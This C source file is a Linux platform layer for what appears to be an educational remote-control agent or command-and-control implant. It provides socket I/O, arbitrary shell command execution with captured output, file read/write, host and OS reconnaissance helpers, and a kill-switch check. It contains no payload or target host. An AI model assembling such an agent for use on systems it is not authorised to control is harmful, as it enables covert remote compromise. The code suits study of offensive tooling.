/* ==========================================================================
 * pal_linux.c — Platform Abstraction Layer (Linux/POSIX)
 * ==========================================================================
 * POSIX implementation of the PAL interface defined in pal.h.
 * Covers sockets, process spawning, file I/O, timing, and system info.
 *
 * ACADEMIC/EDUCATIONAL USE ONLY.
 * ========================================================================== */

#include "pal.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <fcntl.h>

/* ---- Platform initialisation ------------------------------------------ */

int pal_init(void)
{
    /* No special initialisation needed on Linux. */
    return 0;
}

void pal_cleanup(void)
{
    /* Nothing to clean up on Linux. */
}

/* ---- Sockets ---------------------------------------------------------- */

int pal_socket_create(void)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[PAL] socket");
        return -1;
    }
    return sock;
}

int pal_socket_connect(int sock, const char *host, uint16_t port)
{
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));

    addr.sin_family = AF_INET;
    addr.sin_port   = htons(port);

    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
        fprintf(stderr, "[PAL] Invalid address: %s\n", host);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        perror("[PAL] connect");
        return -1;
    }

    return 0;
}

int pal_socket_send(int sock, const void *buf, size_t len)
{
    const uint8_t *ptr = (const uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t sent = send(sock, ptr, remaining, 0);
        if (sent <= 0) {
            perror("[PAL] send");
            return -1;
        }
        ptr       += (size_t)sent;
        remaining -= (size_t)sent;
    }

    return 0;
}

int pal_socket_recv(int sock, void *buf, size_t len)
{
    uint8_t *ptr = (uint8_t *)buf;
    size_t remaining = len;

    while (remaining > 0) {
        ssize_t received = recv(sock, ptr, remaining, 0);
        if (received <= 0) {
            if (received == 0) {
                fprintf(stderr, "[PAL] Connection closed by peer.\n");
            } else {
                perror("[PAL] recv");
            }
            return -1;
        }
        ptr       += (size_t)received;
        remaining -= (size_t)received;
    }

    return 0;
}

void pal_socket_close(int sock)
{
    if (sock >= 0) {
        close(sock);
    }
}

/* ---- Process execution ------------------------------------------------ */

int pal_spawn_process(const char *cmd, char *out_buf, size_t out_size,
                      int *exit_code)
{
    if (cmd == NULL || out_buf == NULL || exit_code == NULL) {
        return -1;
    }

    /* Use popen for simplicity — captures stdout (stderr via 2>&1). */
    char full_cmd[4096];
    snprintf(full_cmd, sizeof(full_cmd), "%s 2>&1", cmd);

    FILE *fp = popen(full_cmd, "r");
    if (fp == NULL) {
        perror("[PAL] popen");
        *exit_code = -1;
        return -1;
    }

    size_t total = 0;
    while (total < out_size - 1) {
        size_t n = fread(out_buf + total, 1, out_size - 1 - total, fp);
        if (n == 0) {
            break;
        }
        total += n;
    }
    out_buf[total] = '\0';

    int status = pclose(fp);
    if (WIFEXITED(status)) {
        *exit_code = WEXITSTATUS(status);
    } else {
        *exit_code = -1;
    }

    return 0;
}

/* ---- File I/O --------------------------------------------------------- */

int pal_read_file(const char *path, uint8_t **buf, size_t *size)
{
    if (path == NULL || buf == NULL || size == NULL) {
        return -1;
    }

    FILE *fp = fopen(path, "rb");
    if (fp == NULL) {
        perror("[PAL] fopen (read)");
        return -1;
    }

    /* Determine file size. */
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("[PAL] fseek");
        fclose(fp);
        return -1;
    }

    long file_size = ftell(fp);
    if (file_size < 0) {
        perror("[PAL] ftell");
        fclose(fp);
        return -1;
    }
    rewind(fp);

    if ((size_t)file_size > MAX_FILE_SIZE) {
        fprintf(stderr, "[PAL] File too large: %ld bytes (max %d)\n",
                file_size, MAX_FILE_SIZE);
        fclose(fp);
        return -1;
    }

    *buf = (uint8_t *)malloc((size_t)file_size);
    if (*buf == NULL) {
        fclose(fp);
        return -1;
    }

    size_t read_bytes = fread(*buf, 1, (size_t)file_size, fp);
    fclose(fp);

    if (read_bytes != (size_t)file_size) {
        free(*buf);
        *buf = NULL;
        return -1;
    }

    *size = (size_t)file_size;
    return 0;
}

int pal_write_file(const char *path, const uint8_t *buf, size_t size)
{
    if (path == NULL || (buf == NULL && size > 0)) {
        return -1;
    }

    FILE *fp = fopen(path, "wb");
    if (fp == NULL) {
        perror("[PAL] fopen (write)");
        return -1;
    }

    if (size > 0) {
        size_t written = fwrite(buf, 1, size, fp);
        if (written != size) {
            perror("[PAL] fwrite");
            fclose(fp);
            return -1;
        }
    }

    fclose(fp);
    return 0;
}

/* ---- Time ------------------------------------------------------------- */

int64_t pal_time_unix(void)
{
    return (int64_t)time(NULL);
}

void pal_sleep_ms(uint32_t ms)
{
    struct timespec ts;
    ts.tv_sec  = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

/* ---- Process control -------------------------------------------------- */

void pal_exit(int code)
{
    exit(code);
}

/* ---- System information ----------------------------------------------- */

int pal_get_hostname(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    if (gethostname(buf, size) != 0) {
        perror("[PAL] gethostname");
        strncpy(buf, "unknown", size - 1);
        buf[size - 1] = '\0';
        return -1;
    }
    buf[size - 1] = '\0';
    return 0;
}

int pal_get_os_info(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    /* Read /proc/version for a descriptive OS string. */
    FILE *fp = fopen("/proc/version", "r");
    if (fp != NULL) {
        if (fgets(buf, (int)size, fp) != NULL) {
            /* Strip trailing newline. */
            size_t len = strlen(buf);
            if (len > 0 && buf[len - 1] == '\n') {
                buf[len - 1] = '\0';
            }
            fclose(fp);
            return 0;
        }
        fclose(fp);
    }

    /* Fallback. */
    snprintf(buf, size, "linux");
    return 0;
}

int pal_get_arch(char *buf, size_t size)
{
    if (buf == NULL || size == 0) {
        return -1;
    }

    /* Use compile-time architecture macros. */
#if defined(__x86_64__) || defined(_M_X64)
    snprintf(buf, size, "x86_64");
#elif defined(__i386__) || defined(_M_IX86)
    snprintf(buf, size, "i386");
#elif defined(__aarch64__)
    snprintf(buf, size, "aarch64");
#elif defined(__arm__)
    snprintf(buf, size, "armv7");
#else
    snprintf(buf, size, "unknown");
#endif

    return 0;
}

/* ---- Logging ---------------------------------------------------------- */

void pal_log(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);

    fprintf(stderr, "[agent] ");
    vfprintf(stderr, fmt, args);
    fprintf(stderr, "\n");

    va_end(args);
}

/* ---- Kill switch ------------------------------------------------------ */

int pal_check_sentinel(const char *path)
{
    if (path == NULL) {
        return 0;
    }

    struct stat st;
    return (stat(path, &st) == 0) ? 1 : 0;
}
